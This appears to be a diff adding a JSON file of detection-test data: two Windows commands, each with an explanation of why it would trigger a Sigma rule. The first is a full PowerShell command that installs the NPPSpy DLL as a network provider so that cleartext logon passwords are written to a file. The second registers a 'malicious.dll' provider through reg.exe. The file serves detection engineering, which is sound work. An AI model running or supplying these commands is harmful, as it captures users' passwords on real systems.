@@ -1,0 +1,10 @@
+[
+  {
+    "output": "powershell.exe -Command \"Copy-Item 'C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\NPPSPY.dll' -Destination 'C:\\Windows\\System32'; $path = Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order' -Name PROVIDERORDER; $UpdatedValue = $Path.PROVIDERORDER + ',NPPSpy'; Set-ItemProperty -Path $Path.PSPath -Name 'PROVIDERORDER' -Value $UpdatedValue; New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore | Out-Null; New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore | Out-Null; New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name 'Class' -Value 2 -ErrorAction Ignore | Out-Null; New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name 'Name' -Value NPPSpy -ErrorAction Ignore | Out-Null; New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name 'ProviderPath' -PropertyType ExpandString -Value '%SystemRoot%\\System32\\NPPSPY.dll' -ErrorAction Ignore | Out-Null; Write-Output '[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt'\"",
+    "explanation": "This command uses PowerShell to perform the same actions as the original command but with simplified syntax and omitted unnecessary quotes. It still creates the malicious registry entries and copies the DLL, which would trigger the Sigma rule."
+  },
+  {
+    "output": "reg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Services\\MyProvider /v NetworkProvider /t REG_SZ /d malicious.dll /f",
+    "explanation": "This command uses the `reg.exe` utility to add a new registry key for a network provider. It is a simplified version of the original command, with no unnecessary spaces or quotes, but it performs the same action and would still be detected by the Sigma rule."
+  }
+]
